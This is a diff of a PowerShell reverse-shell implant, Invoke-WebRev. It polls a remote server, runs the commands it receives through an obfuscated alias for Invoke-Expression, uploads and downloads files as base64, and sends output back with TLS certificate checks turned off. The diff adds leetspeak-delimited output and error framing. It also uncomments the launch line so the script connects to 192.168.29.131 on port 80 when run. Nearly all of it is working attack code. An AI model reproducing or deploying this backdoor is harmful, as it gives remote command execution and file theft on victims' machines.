@@ -40,6 +40,8 @@ function Invoke-WebRev{
     [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
     $pwd = "pwd | Format-Table -HideTableHeaders";
+    $error[0] = "";
+    $parser = "|||P4RS3R|||";
 
     while ($true)
     {
@@ -54,16 +56,18 @@ function Invoke-WebRev{
 
             if($cstr.split(" ")[0] -eq "upload")
             {
+                $type = "|||UPL04D|||";
                 $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
                 $location = $cstr.split(" ")[2];
                 $content = [System.Convert]::FromBase64String($uploadData);
                 $content | Set-Content $location -Encoding Byte
-                $result += "[+] File successfully uploaded.`r`n";
+                $result += "[+] File successfully uploaded." + $parser;
                 $cstr = $pwd;
             }
 
             elseif($cstr.split(" ")[0] -eq "download")
             {
+                $type = "|||D0WNL04D|||";
                 $commarray = $cstr.split(" ");
                 $pathSrc = $commarray[1];
                 $pathDst = $commarray[2];
@@ -71,7 +75,7 @@ function Invoke-WebRev{
                 {
                     $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
                     $b64 = [System.Convert]::ToBase64String($downloadData);
-                    $dataToSend = "D0wnL04d" + $b64 + "D0wnL04d`r`n`r`n" + $pathDst + "`r`n`r`n[+] File successfully downloaded.`r`n";
+                    $dataToSend = "_D0wnL04d_" + $b64 + "_D0wnL04d_" + $parser + $pathDst + $parser + "[+] File successfully downloaded." + $parser;
                     $result += $datatoSend;
                 } 
                 else
@@ -80,15 +84,37 @@ function Invoke-WebRev{
                 }
                 $cstr = $pwd;
             }
+            else
+            {
+                $type = "|||C0MM4ND|||";
+            }
 
-            
             $enc = [system.Text.Encoding]::UTF8;
-            $bytes = $enc.GetBytes((taleska-ei-vrixeka $cstr | Out-String));
+            $new = (taleska-ei-vrixeka $cstr | Out-String);
+            $new = $new -replace "`r`n`r`n",$parser;
+            $new = $type + $new;
+
+            $bytes = $enc.GetBytes($new);
             $bytes2 = $enc.GetBytes($result);
             $result = [Convert]::ToBase64String($bytes2 + $bytes);
             $postParams = @{result=$result};
-        }catch {};
+        }
+        catch
+        {
+            if ($error[0] -ne "")
+            {
+                $type = "|||3RR0R|||";
+                $err = $error[0] | Out-String;
+                $new = (taleska-ei-vrixeka $pwd | Out-String);
+                $error[0]= "";
+                $data = $type + $err + $parser + $new;
+
+                $bytes = $enc.GetBytes($data);
+                $result = [Convert]::ToBase64String($bytes);
+                $postParams = @{result=$result};
+            }
+        };
     };
 }
 
-#Invoke-WebRev -ip 192.168.100.128 -port 80
+Invoke-WebRev -ip 192.168.29.131 -port 80
